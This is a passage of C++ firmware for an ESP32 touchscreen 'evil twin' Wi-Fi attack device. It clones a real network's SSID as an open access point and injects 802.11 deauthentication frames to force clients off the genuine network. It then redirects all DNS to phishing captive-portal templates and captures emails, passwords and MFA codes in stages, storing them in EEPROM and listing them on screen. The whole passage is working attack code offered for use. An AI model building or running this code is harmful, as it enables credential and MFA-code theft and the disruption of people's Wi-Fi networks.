                  email ? email : "", password ? password : "", mfa ? mfa : "");
    #endif
}

// Update MFA field on most recent credential
static void updateLastCredMFA(const char* mfa) {
    int count = EEPROM.read(COUNT_ADDR);
    if (count <= 0 || count > MAX_CREDS) return;

    int addr = CRED_ADDR + ((count - 1) * CRED_SIZE);
    Credential cred;
    EEPROM.get(addr, cred);
    if (mfa) strncpy(cred.mfa, mfa, 7);
    EEPROM.put(addr, cred);
    EEPROM.commit();
}

// ═══════════════════════════════════════════════════════════════════════════
// WEB HANDLERS
// ═══════════════════════════════════════════════════════════════════════════

static void handleRoot() {
    terminalPrint("[+] Client connected", HALEHOUND_MAGENTA);
    totalClients++;

    const char* page = getPortalPage(currentTemplate, NULL);
    String html = FPSTR(page);
    server.send(200, "text/html", html);
}

static void handleCapture() {
    String stage = server.arg("stage");
    String email = server.arg("email");
    String password = server.arg("password");
    String mfaCode = server.arg("mfa_code");
    String room = server.arg("room");

    if (stage == "email") {
        // Multi-stage: email captured, serve password page
        email.toCharArray(capturedEmail, 32);
        terminalPrint("[!] EMAIL: " + email, HALEHOUND_HOTPINK);

        const char* page = getPortalPage(currentTemplate, "password");
        String html = FPSTR(page);
        html.replace("{{EMAIL}}", email);
        server.send(200, "text/html", html);
        drawStats();
        return;

    } else if (stage == "password") {
        // Multi-stage: password captured, serve MFA page
        terminalPrint("[!] PASS: " + password, HALEHOUND_HOTPINK);
        saveCredential(email.c_str(), password.c_str(), NULL);

        const char* page = getPortalPage(currentTemplate, "mfa");
        String html = FPSTR(page);
        html.replace("{{EMAIL}}", email);
        server.send(200, "text/html", html);
        drawStats();
        return;

    } else if (stage == "mfa") {
        // Multi-stage: MFA captured, serve success
        terminalPrint("[!] MFA: " + mfaCode, HALEHOUND_HOTPINK);
        updateLastCredMFA(mfaCode.c_str());

        String html = FPSTR(portal_success);
        server.send(200, "text/html", html);
        drawStats();
        return;

    } else {
        // Single-stage: all fields captured at once
        if (email.length() > 0) {
            terminalPrint("[!] EMAIL: " + email, HALEHOUND_HOTPINK);
        }
        if (password.length() > 0) {
            terminalPrint("[!] PASS: " + password, HALEHOUND_HOTPINK);
        }

        // Hotel template: store room in MFA field
        const char* extra = NULL;
        if (room.length() > 0) {
            terminalPrint("[!] ROOM: " + room, HALEHOUND_HOTPINK);
            extra = room.c_str();
        }

        saveCredential(email.c_str(), password.c_str(), extra);

        String html = FPSTR(portal_success);
        server.send(200, "text/html", html);
        drawStats();
        return;
    }
}

static void handleCaptive() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
}

static void handleSuccess() {
    String html = FPSTR(portal_success);
    server.send(200, "text/html", html);
}

static void setupWebHandlers() {
    server.on("/", HTTP_GET, handleRoot);
    server.on("/", HTTP_POST, handleRoot);
    server.on("/capture", HTTP_POST, handleCapture);
    server.on("/success", HTTP_GET, handleSuccess);
    // Captive portal detection endpoints
    server.on("/generate_204", HTTP_GET, handleCaptive);        // Android
    server.on("/hotspot-detect.html", HTTP_GET, handleCaptive); // Apple/iOS
    server.on("/ncsi.txt", HTTP_GET, handleCaptive);            // Windows
    server.on("/connecttest.txt", HTTP_GET, handleCaptive);     // Windows 10+
    server.onNotFound(handleCaptive);                           // Catch-all
}

// ═══════════════════════════════════════════════════════════════════════════
// PORTAL START/STOP
// ═══════════════════════════════════════════════════════════════════════════

// Background deauth — same proven pattern as EAPOL module
static void sendBgDeauth() {
    if (!hasTarget) return;

    uint8_t deauthFrame[26] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason: Class 3 frame
    };

    memcpy(deauthFrame + 10, targetBSSID, 6);
    memcpy(deauthFrame + 16, targetBSSID, 6);

    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    int sent = 0;
    for (int i = 0; i < CP_DEAUTH_BURST; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false) == ESP_OK) {
            sent++;
        }
        delayMicroseconds(10000);  // 10ms between frames
    }

    #if CYD_DEBUG
    Serial.printf("[PORTAL] BG Deauth: %d/%d sent on ch%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  sent, CP_DEAUTH_BURST, targetChannel,
                  targetBSSID[0], targetBSSID[1], targetBSSID[2],
                  targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    #endif
}

void startPortal() {
    if (portalActive) return;

    // Template already set by user via arrows or auto-detected via saveSSID()
    // Do NOT override here — respect manual selection

    // Quick scan for real AP — get BSSID + channel for background deauth
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    hasTarget = false;
    for (int i = 0; i < n; i++) {
        if (strcasecmp(WiFi.SSID(i).c_str(), customSSID) == 0) {
            memcpy(targetBSSID, WiFi.BSSID(i), 6);
            targetChannel = WiFi.channel(i);
            hasTarget = true;
            Serial.printf("[PORTAL] Real AP found: %02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                          targetBSSID[0], targetBSSID[1], targetBSSID[2],
                          targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel);
            break;
        }
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Start evil twin — APSTA mode required for deauth frame injection
    uint8_t ch = hasTarget ? targetChannel : 1;
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(customSSID, NULL, ch);  // Open AP on target's channel

    esp_wifi_set_max_tx_power(82);  // Max TX power
    esp_wifi_set_ps(WIFI_PS_NONE);  // No power save

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", WiFi.softAPIP());

    setupWebHandlers();
    server.begin();

    portalActive = true;
    bgDeauthActive = hasTarget;
    lastBgDeauth = 0;
    currentScreen = SCREEN_PORTAL_ACTIVE;
    totalClients = 0;
    prevClientCount = 0;
    memset(capturedEmail, 0, sizeof(capturedEmail));

    terminalPrint("[*] EVIL TWIN ACTIVE", HALEHOUND_MAGENTA);
    terminalPrint("[*] SSID: " + String(customSSID), HALEHOUND_MAGENTA);
    terminalPrint("[*] IP: " + WiFi.softAPIP().toString(), HALEHOUND_MAGENTA);
    terminalPrint("[*] CH: " + String(ch), HALEHOUND_MAGENTA);
    terminalPrint("[*] Template: " + String(portalTemplateNames[currentTemplate]), HALEHOUND_HOTPINK);
    if (bgDeauthActive) {
        terminalPrint("[*] BG DEAUTH ACTIVE", HALEHOUND_MAGENTA);
        terminalPrint("[*] Kicking clients to evil twin...", HALEHOUND_MAGENTA);
    } else {
        terminalPrint("[!] Real AP not found — no deauth", HALEHOUND_GUNMETAL);
    }

    drawMainScreen();

    #if CYD_DEBUG
    Serial.printf("[PORTAL] Started: SSID=%s Template=%s bgDeauth=%s\n",
                  customSSID, portalTemplateNames[currentTemplate],
                  bgDeauthActive ? "ON" : "OFF");
    #endif
}

void stopPortal() {
    if (!portalActive) return;

    bgDeauthActive = false;
    hasTarget = false;
    server.close();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);

    portalActive = false;
    currentScreen = SCREEN_MAIN;

    terminalPrint("[*] Portal STOPPED", HALEHOUND_HOTPINK);
    drawMainScreen();

    #if CYD_DEBUG
    Serial.println("[PORTAL] Stopped");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// EEPROM FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void loadSSID() {
    String saved = "";
    for (int i = 0; i < 32; i++) {
        char c = EEPROM.read(SSID_ADDR + i);
        if (c == 0) break;
        if (c < 32 || c > 126) break;  // Invalid char guard
        saved += c;
    }
    if (saved.length() > 0) {
        saved.toCharArray(customSSID, 32);
    } else {
        strcpy(customSSID, defaultSSID);
    }
}

void saveSSID(const char* ssid) {
    EEPROM.begin(EEPROM_SIZE);  // Ensure EEPROM is initialized (safe to call multiple times)
    for (int i = 0; i < 32; i++) {
        if (i < (int)strlen(ssid)) {
            EEPROM.write(SSID_ADDR + i, ssid[i]);
        } else {
            EEPROM.write(SSID_ADDR + i, 0);
        }
    }
    EEPROM.commit();
    strncpy(customSSID, ssid, 31);
    customSSID[31] = '\0';

    // Auto-select template when SSID changes
    currentTemplate = autoSelectTemplate(customSSID);
    EEPROM.write(TMPL_ADDR, (uint8_t)currentTemplate);
    EEPROM.commit();
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: ICON BAR (y=20-36)
// back(x=10) | ssid/kbd(x=55) | <tmpl(x=100) | tmpl>(x=135) | play/stop(x=175) | creds(x=215)
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Back
    tft.drawBitmap(iconX[0], iconY, bitmap_icon_go_back, CP_ICON_SIZE, CP_ICON_SIZE, HALEHOUND_MAGENTA);
    // SSID keyboard
    tft.drawBitmap(iconX[1], iconY, bitmap_icon_dialog, CP_ICON_SIZE, CP_ICON_SIZE, HALEHOUND_MAGENTA);
    // Template left arrow
    tft.drawBitmap(iconX[2], iconY, bitmap_icon_LEFT, CP_ICON_SIZE, CP_ICON_SIZE, HALEHOUND_MAGENTA);
    // Template right arrow
    tft.drawBitmap(iconX[3], iconY, bitmap_icon_RIGHT, CP_ICON_SIZE, CP_ICON_SIZE, HALEHOUND_MAGENTA);
    // Start/Stop toggle (antenna = active indicator)
    uint16_t antennaColor = portalActive ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
    tft.drawBitmap(iconX[4], iconY, bitmap_icon_antenna, CP_ICON_SIZE, CP_ICON_SIZE, antennaColor);
    // Credentials list
    tft.drawBitmap(iconX[5], iconY, bitmap_icon_list, CP_ICON_SIZE, CP_ICON_SIZE, HALEHOUND_MAGENTA);

    // Separator line
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: HEADER (y=38-68) - "EVIL TWIN" glitch title + template badge
// ═══════════════════════════════════════════════════════════════════════════

static void drawHeader() {
    tft.fillRect(0, 38, SCREEN_WIDTH, 30, HALEHOUND_BLACK);

    // Title — Nosifer with chromatic aberration
    drawGlitchText(55, "EVIL TWIN", &Nosifer_Regular10pt7b);

    // Template badge centered below title
    tft.setTextSize(1);
    const char* tmplName = portalTemplateNames[currentTemplate];
    int nameLen = strlen(tmplName);
    int badgeW = (nameLen * 6) + 8;

    // Center badges (including 3-STAGE if multi-stage)
    int totalW = badgeW;
    if (isMultiStage(currentTemplate)) totalW += 50;
    int badgeX = (SCREEN_WIDTH - totalW) / 2;

    if (isMultiStage(currentTemplate)) {
        tft.fillRoundRect(badgeX, 59, 44, 9, 2, HALEHOUND_VIOLET);
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(badgeX + 3, 60);
        tft.print("3-STAGE");
        badgeX += 50;
    }

    tft.fillRoundRect(badgeX, 59, badgeW, 9, 2, HALEHOUND_DARK);
    tft.drawRoundRect(badgeX, 59, badgeW, 9, 2, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(badgeX + 4, 60);
    tft.print(tmplName);

    // Template index on right
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(SCREEN_WIDTH - 24, 60);
    tft.printf("%d/%d", currentTemplate + 1, TMPL_COUNT);
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: INFO (y=69-89) - SSID in frame, status with indicator dot
// ═══════════════════════════════════════════════════════════════════════════

static void drawInfo() {
    tft.fillRect(0, 69, SCREEN_WIDTH, 21, HALEHOUND_BLACK);

    tft.setTextSize(1);

    // SSID in subtle rounded frame
    tft.drawRoundRect(3, 70, SCREEN_WIDTH - 6, 12, 2, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(8, 72);
    tft.print("AP:");
    tft.setTextColor(HALEHOUND_HOTPINK);
    String displaySSID = String(customSSID);
    if (displaySSID.length() > 22) displaySSID = displaySSID.substring(0, 22) + "..";
    tft.setCursor(26, 72);
    tft.print(displaySSID);

    // Status line with indicator dot
    if (portalActive) {
        tft.fillCircle(9, 86, 3, 0x07E0);
        tft.setTextColor(0x07E0);
        tft.setCursor(16, 83);
        tft.print("LIVE");

        int clients = WiFi.softAPgetStationNum();
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(50, 83);
        tft.printf("| Clients: %d", clients);
    } else {
        tft.drawCircle(9, 86, 3, HALEHOUND_GUNMETAL);
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(16, 83);
        tft.print("IDLE");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: TERMINAL (y=90-272) - Live scrolling event/credential feed
// ═══════════════════════════════════════════════════════════════════════════

static void drawTerminal() {
    tft.fillRect(0, TERM_Y_START, SCREEN_WIDTH, TERM_Y_END - TERM_Y_START, HALEHOUND_BLACK);

    // Thin border around terminal area
    tft.drawRect(2, TERM_Y_START, SCREEN_WIDTH - 4, TERM_Y_END - TERM_Y_START, HALEHOUND_DARK);

    tft.setTextSize(1);
    for (int i = 0; i < lineCount && i < TERM_MAX_LINES; i++) {
        int yPos = TERM_Y_START + (i * TERM_LINE_HEIGHT);

        // Left gutter color marker
        tft.fillRect(3, yPos + 1, 2, TERM_LINE_HEIGHT - 2, colorBuffer[i]);

        // Text content
        tft.setTextColor(colorBuffer[i]);
        tft.setCursor(8, yPos + 2);

        // Truncate long lines for 240px width (slightly narrower for border)
        String line = terminalBuffer[i];
        if (line.length() > 37) line = line.substring(0, 37);
        tft.print(line);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: STATS (y=273-282) - Total clients + creds captured
// ═══════════════════════════════════════════════════════════════════════════

static void drawStats() {
    tft.fillRect(0, 273, SCREEN_WIDTH, 10, HALEHOUND_BLACK);
    tft.drawLine(5, 273, SCREEN_WIDTH - 5, 273, HALEHOUND_DARK);

    int credCount = EEPROM.read(COUNT_ADDR);
    if (credCount > MAX_CREDS) credCount = 0;

    tft.setTextSize(1);

    // Client count
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(5, 275);
    tft.print("Clients:");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.printf(" %d", totalClients);

    // Separator
    tft.setTextColor(HALEHOUND_DARK);
    tft.setCursor(90, 275);
    tft.print("|");

    // Cred count
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(100, 275);
    tft.print("Creds:");
    tft.setTextColor(credCount > 0 ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL);
    tft.printf(" %d", credCount);

    // Template name on right
    tft.setTextColor(HALEHOUND_VIOLET);
    const char* tmplName = portalTemplateNames[currentTemplate];
    int nameLen = strlen(tmplName);
    tft.setCursor(SCREEN_WIDTH - (nameLen * 6) - 5, 275);
    tft.print(tmplName);
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: BUTTON BAR (y=283-319) - BACK | START/STOP | CREDS
// ═══════════════════════════════════════════════════════════════════════════

static void drawButtonBar() {
    int btnY = 290;
    int btnH = 24;
    int btnW = 70;

    tft.fillRect(0, 283, SCREEN_WIDTH, SCREEN_HEIGHT - 283, HALEHOUND_BLACK);
    tft.drawLine(0, 284, SCREEN_WIDTH, 284, HALEHOUND_DARK);

    // BACK button — outlined hotpink
    tft.drawRoundRect(5, btnY, btnW, btnH, 4, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(25, btnY + 8);
    tft.print("BACK");

    // START/STOP button — filled when active
    if (portalActive) {
        tft.fillRoundRect(85, btnY, btnW, btnH, 4, HALEHOUND_HOTPINK);
        tft.setTextColor(HALEHOUND_BLACK);
        tft.setCursor(105, btnY + 8);
        tft.print("STOP");
    } else {
        tft.fillRoundRect(85, btnY, btnW, btnH, 4, HALEHOUND_DARK);
        tft.drawRoundRect(85, btnY, btnW, btnH, 4, 0x07E0);
        tft.setTextColor(0x07E0);
        tft.setCursor(98, btnY + 8);
        tft.print("START");
    }

    // CREDS button — outlined violet
    tft.drawRoundRect(165, btnY, btnW, btnH, 4, HALEHOUND_VIOLET);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(182, btnY + 8);
    tft.print("CREDS");
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: MAIN SCREEN (compose all sections)
// ═══════════════════════════════════════════════════════════════════════════

static void drawMainScreen() {
    tft.fillRect(0, 20, SCREEN_WIDTH, SCREEN_HEIGHT - 20, HALEHOUND_BLACK);
    currentScreen = portalActive ? SCREEN_PORTAL_ACTIVE : SCREEN_MAIN;

    // Cyan line below status bar
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);

    drawIconBar();
    drawHeader();
    drawInfo();
    drawTerminal();
    drawStats();
    drawButtonBar();
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: SSID KEYBOARD
// ═══════════════════════════════════════════════════════════════════════════

// Draw the SSID input field with cursor (only redraws the text area)
static void drawInputField() {
    tft.fillRect(12, 57, SCREEN_WIDTH - 26, 20, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(2);
    tft.setCursor(15, 58);
    String displayText = inputSSID;
    if (cursorState && keyboardActive) {
        displayText += "_";
    }
    // Truncate if too long for display
    if (displayText.length() > 11) {
        displayText = displayText.substring(displayText.length() - 11);
    }
    tft.print(displayText);
    tft.setTextSize(1);
}

// Draw the input field box (called once when keyboard opens)
static void drawInputBox() {
    tft.fillRect(10, 55, SCREEN_WIDTH - 20, 25, HALEHOUND_DARK);
    tft.drawRect(10, 55, SCREEN_WIDTH - 20, 25, HALEHOUND_HOTPINK);
    drawInputField();
}

// Draw the on-screen keyboard
static void drawKeyboard() {
    currentScreen = SCREEN_KEYBOARD;
    keyboardActive = true;

    // Clear content area below icon bar
    tft.fillRect(0, 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_BLACK);

    // Draw icon bar (Back icon only for keyboard screen)
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);

    // Instructions
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(5, 42);
    tft.print("Enter SSID:");

    // Draw input box
    drawInputBox();

    // Draw keyboard keys
    int yOffset = 85;
    for (int row = 0; row < 4; row++) {
        int xOffset = 5;
        for (int col = 0; col < (int)strlen(keyboardLayout[row]); col++) {
            tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, HALEHOUND_DARK);
            tft.drawRect(xOffset, yOffset, keyWidth, keyHeight, HALEHOUND_GUNMETAL);
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setTextSize(1);
            tft.setCursor(xOffset + 7, yOffset + 5);
            tft.print(keyboardLayout[row][col]);
            xOffset += keyWidth + keySpacing;
        }
        yOffset += keyHeight + keySpacing;
    }

    // Draw buttons: Back, Shuffle, OK
    int btnY = 170;

    // Back button
    tft.fillRoundRect(5, btnY, 70, 22, 3, HALEHOUND_DARK);
    tft.drawRoundRect(5, btnY, 70, 22, 3, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(25, btnY + 7);
    tft.print("Back");

    // Auto button (auto-select template from SSID)
    tft.fillRoundRect(85, btnY, 70, 22, 3, HALEHOUND_DARK);
    tft.drawRoundRect(85, btnY, 70, 22, 3, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(102, btnY + 7);
    tft.print("Auto");

    // OK button
    tft.fillRoundRect(165, btnY, 70, 22, 3, HALEHOUND_DARK);
    tft.drawRoundRect(165, btnY, 70, 22, 3, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(192, btnY + 7);
    tft.print("OK");

    // Help text
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setTextSize(1);
    tft.setCursor(5, 198);
    tft.print("^ Shift  < Bksp  - Clear  _ Space");
}

// Handle keyboard touch input
static void handleKeyboard(int x, int y) {
    // Check icon bar Back button (y=20-36, x=5-30)
    if (y >= 20 && y <= 40 && x >= 5 && x <= 30) {
        currentScreen = SCREEN_MAIN;
        keyboardActive = false;
        inputSSID = "";
        waitForReleaseFlag = true;
        drawMainScreen();
        return;
    }

    // Check keyboard keys
    int yOffset = 85;
    for (int row = 0; row < 4; row++) {
        int xOffset = 5;
        for (int col = 0; col < (int)strlen(keyboardLayout[row]); col++) {
            if (x >= xOffset && x <= xOffset + keyWidth &&
                y >= yOffset && y <= yOffset + keyHeight) {
                char c = keyboardLayout[row][col];

                // Visual feedback
                tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, HALEHOUND_HOTPINK);
                tft.setTextColor(HALEHOUND_BLACK);
                tft.setCursor(xOffset + 7, yOffset + 5);
                tft.print(c);
                delay(80);
                tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, HALEHOUND_DARK);
                tft.drawRect(xOffset, yOffset, keyWidth, keyHeight, HALEHOUND_GUNMETAL);
                tft.setTextColor(HALEHOUND_MAGENTA);
                tft.setCursor(xOffset + 7, yOffset + 5);
                tft.print(c);

                // Handle special keys
                if (c == '<') {  // Backspace
                    if (inputSSID.length() > 0) {
                        inputSSID = inputSSID.substring(0, inputSSID.length() - 1);
                    }
                } else if (c == '-') {  // Clear
                    inputSSID = "";
                } else if (c == '^') {  // Shift
                    shiftActive = !shiftActive;
                    keyboardLayout = shiftActive ? keyboardUpper : keyboardLower;
                    drawKeyboard();
                    return;
                } else if (c == '_') {  // Space
                    if (inputSSID.length() < 30) inputSSID += " ";
                } else {
                    if (inputSSID.length() < 30) inputSSID += c;
                }
                drawInputField();
                return;
            }
            xOffset += keyWidth + keySpacing;
        }
        yOffset += keyHeight + keySpacing;
    }

    // Check buttons
    int btnY = 170;

    // Back button (5-75, btnY to btnY+25)
    if (x >= 5 && x <= 75 && y >= btnY && y <= btnY + 25) {
        currentScreen = SCREEN_MAIN;
        keyboardActive = false;
        inputSSID = "";
        waitForReleaseFlag = true;
        drawMainScreen();
        return;
    }

    // Auto button (85-155, btnY to btnY+25) — auto-detect template from typed SSID
    if (x >= 85 && x <= 155 && y >= btnY && y <= btnY + 25) {
        if (inputSSID.length() > 0) {
            currentTemplate = autoSelectTemplate(inputSSID.c_str());
            // Visual feedback: show detected template
            tft.fillRect(5, 210, SCREEN_WIDTH - 10, 12, HALEHOUND_BLACK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(5, 210);
            tft.printf("Template: %s", portalTemplateNames[currentTemplate]);
        }
        return;
    }

    // OK button (165-235, btnY to btnY+25)
    if (x >= 165 && x <= 235 && y >= btnY && y <= btnY + 25) {
        if (inputSSID.length() > 0) {
            saveSSID(inputSSID.c_str());
            currentScreen = SCREEN_MAIN;
            keyboardActive = false;
            waitForReleaseFlag = true;
            drawMainScreen();
        }
        return;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY: CREDENTIAL LIST
// ═══════════════════════════════════════════════════════════════════════════

static void drawCredList() {
    tft.fillRect(0, 20, SCREEN_WIDTH, SCREEN_HEIGHT - 20, HALEHOUND_BLACK);

    // Icon bar with Back
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);

    currentScreen = SCREEN_CRED_LIST;

    // Title — Nosifer with chromatic aberration
    drawGlitchText(55, "CREDENTIALS", &Nosifer_Regular10pt7b);

    int count = EEPROM.read(COUNT_ADDR);
    if (count > MAX_CREDS) count = 0;

    if (count == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setTextSize(1);
        tft.setCursor(30, 65);
        tft.print("No credentials captured");
    } else {
        int y = 58;
        int start = credPage * 8;
        int end = min(count, start + 8);

        for (int i = start; i < end; i++) {
            Credential cred;
            EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);

            // Index
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(5, y);
            tft.printf("#%d", i + 1);

            // Email
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(25, y);
            String emailStr = String(cred.email);
            if (emailStr.length() > 25) emailStr = emailStr.substring(0, 25);
            tft.print(emailStr);
            y += 12;

            // Password
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(25, y);
            tft.printf("pw: %s", cred.password);

            // MFA/Room if present
            if (strlen(cred.mfa) > 0) {
                tft.setTextColor(HALEHOUND_VIOLET);
                tft.setCursor(150, y);
                tft.printf("mfa: %s", cred.mfa);
            }
            y += 16;
        }

        // Page indicator
        int totalPages = (count + 7) / 8;
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(5, SCREEN_HEIGHT - 40);
        tft.printf("Page %d/%d  (%d total)", credPage + 1, totalPages, count);
    }

    // Bottom buttons
    int btnY = SCREEN_HEIGHT - 25;

    // BACK button
    tft.fillRoundRect(5, btnY, 70, 20, 3, HALEHOUND_DARK);
    tft.drawRoundRect(5, btnY, 70, 20, 3, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(25, btnY + 6);
    tft.print("BACK");

    // PAGE button (cycle pages)
    if (count > 8) {
        tft.fillRoundRect(85, btnY, 70, 20, 3, HALEHOUND_DARK);
        tft.drawRoundRect(85, btnY, 70, 20, 3, HALEHOUND_MAGENTA);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(105, btnY + 6);
        tft.print("PAGE");
    }

    // CLEAR button
    tft.fillRoundRect(165, btnY, 70, 20, 3, HALEHOUND_DARK);
    tft.drawRoundRect(165, btnY, 70, 20, 3, HALEHOUND_VIOLET);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(180, btnY + 6);
    tft.print("CLEAR");
}

// ═══════════════════════════════════════════════════════════════════════════
// TOUCH HANDLER - waitForRelease pattern, NO buttonPressed() calls
// ═══════════════════════════════════════════════════════════════════════════

static void handleTouch() {
    static unsigned long lastTap = 0;

    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    // Wait for finger to lift after any view-changing action
    if (waitForReleaseFlag) {
        if (!touching) waitForReleaseFlag = false;
        return;
    }

    if (!touching) return;
    if (millis() - lastTap < 300) return;  // 300ms debounce
    lastTap = millis();

    // ── Keyboard screen: delegate to keyboard handler ─────────────────
    if (currentScreen == SCREEN_KEYBOARD) {
        handleKeyboard(tx, ty);
        return;
    }

    // ── Credential list screen ─────────────────────────────────────────
    if (currentScreen == SCREEN_CRED_LIST) {
        int btnY = SCREEN_HEIGHT - 25;

        // Back icon in icon bar
        if (ty >= 20 && ty <= 40 && tx >= 5 && tx <= 30) {
            credPage = 0;
            waitForReleaseFlag = true;
            drawMainScreen();
            return;
        }

        // BACK button
        if (ty >= btnY && ty <= btnY + 22 && tx >= 5 && tx <= 75) {
            credPage = 0;
            waitForReleaseFlag = true;
            drawMainScreen();
            return;
        }

        // PAGE button
        if (ty >= btnY && ty <= btnY + 22 && tx >= 85 && tx <= 155) {
            int count = EEPROM.read(COUNT_ADDR);
            if (count > MAX_CREDS) count = 0;
            int totalPages = (count + 7) / 8;
            if (totalPages > 0) {
                credPage = (credPage + 1) % totalPages;
            }
            waitForReleaseFlag = true;
            drawCredList();
            return;
        }

        // CLEAR button
        if (ty >= btnY && ty <= btnY + 22 && tx >= 165 && tx <= 235) {
            clearAllCredentials();
            credPage = 0;
            waitForReleaseFlag = true;
            drawCredList();
            return;
        }
        return;
    }

    // ── Main / Active screen ──────────────────────────────────────────

    // Icon bar (y=20-36)
    if (ty >= 18 && ty <= 40) {
        // Back icon (x=10)
        if (tx >= 5 && tx <= 30) {
            exitRequested = true;
            waitForReleaseFlag = true;
            return;
        }
        // SSID keyboard icon (x=55)
        if (tx >= 45 && tx <= 75) {
            if (!portalActive) {
                inputSSID = "";
                cursorState = false;
                lastCursorToggle = millis();
                waitForReleaseFlag = true;
                drawKeyboard();
            }
            return;
        }
        // Template left arrow (x=100)
        if (tx >= 90 && tx <= 120) {
            if (!portalActive) {
                currentTemplate = (PortalTemplate)((currentTemplate + TMPL_COUNT - 1) % TMPL_COUNT);
                EEPROM.write(TMPL_ADDR, (uint8_t)currentTemplate);
                EEPROM.commit();
                saveSSID(templateSSIDs[currentTemplate]);
                waitForReleaseFlag = true;
                drawHeader();
                drawInfo();
            }
            return;
        }
        // Template right arrow (x=135)
        if (tx >= 125 && tx <= 155) {
            if (!portalActive) {
                currentTemplate = (PortalTemplate)((currentTemplate + 1) % TMPL_COUNT);
                EEPROM.write(TMPL_ADDR, (uint8_t)currentTemplate);
                EEPROM.commit();
                saveSSID(templateSSIDs[currentTemplate]);
                waitForReleaseFlag = true;
                drawHeader();
                drawInfo();
            }
            return;
        }
        // Start/Stop toggle (x=175)
        if (tx >= 165 && tx <= 195) {
            if (portalActive) {
                stopPortal();
            } else {
                startPortal();
            }
